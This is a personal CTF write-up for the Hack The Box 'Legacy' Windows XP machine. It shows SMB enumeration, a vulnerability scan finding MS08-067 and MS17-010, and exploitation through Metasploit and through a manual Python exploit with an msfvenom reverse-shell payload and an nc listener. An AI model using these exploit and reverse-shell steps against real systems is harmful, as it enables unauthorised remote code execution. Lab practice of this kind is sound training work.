#windows
# Enumeration
## Nmap
```
nmap -sC -sV legacy.htb  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-02 01:35 EST
Nmap scan report for legacy.htb (10.129.227.181)
Host is up (0.18s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h57m38s, deviation: 1h24m50s, median: 4d23h57m38s
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2023-03-07T10:33:32+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 005056b99f6b (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.24 seconds
                                                            
```

## RPC port 135
```
rpcclient -U "" -N legacy.htb
rpcclient $> 
```
## SMB port 445
```
smbmap -H legacy.htb
[+] IP: legacy.htb:445  Name: unknown             
```

## Vuln scan
Could not find anything really so perform vuln scan
```
nmap --script vuln -p 445 legacy.htb
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-02 01:49 EST
Nmap scan report for legacy.htb (10.129.227.181)
Host is up (0.18s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)

Nmap done: 1 IP address (1 host up) scanned in 25.98 seconds
```

### vulns
smb-vuln-ms08-067
https://www.exploit-db.com/exploits/7104

smb-vuln-ms17-010
https://www.exploit-db.com/exploits/42315


# Foothold + Exploit
## ms08-067 metasploit
```
msf6 exploit(windows/smb/ms08_067_netapi) > run

[*] Started reverse TCP handler on 10.10.14.39:4444 
[*] 10.129.220.158:445 - Automatically detecting the target...
[*] 10.129.220.158:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.129.220.158:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.129.220.158:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175686 bytes) to 10.129.220.158
[*] Meterpreter session 1 opened (10.10.14.39:4444 -> 10.129.220.158:1040) at 2023-03-02 05:36:16 -0500

meterpreter >
```

## ms08-067 no metasploit

https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.39 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
```
Payload prep

replace the payload
![[Pasted image 20230302194457.png]]
```
 python3 exploit.py 10.129.220.158 6 445
#######################################################################
#   MS08-067 Exploit
#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
#
#   Mod in 2018 by Andy Acer
#   - Added support for selecting a target port at the command line.
#   - Changed library calls to allow for establishing a NetBIOS session for SMB transport
#   - Changed shellcode handling to allow for variable length shellcode.
#######################################################################


$   This version requires the Python Impacket library version to 0_9_17 or newer.
$
$   Here's how to upgrade if necessary:
$
$   git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impacket/
$   cd impacket
$   pip install .


#######################################################################

Windows XP SP3 English (NX)

[-]Initiating connection
[-]connected to ncacn_np:10.129.220.158[\pipe\browser]
Exploit finish
```

```
nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.14.39] from (UNKNOWN) [10.129.220.158] 1041
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```


## Flags
This is windows xp so no whoami

```
C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
```

```
C:\Documents and Settings\john\Desktop>type user.txt
type user.txt
```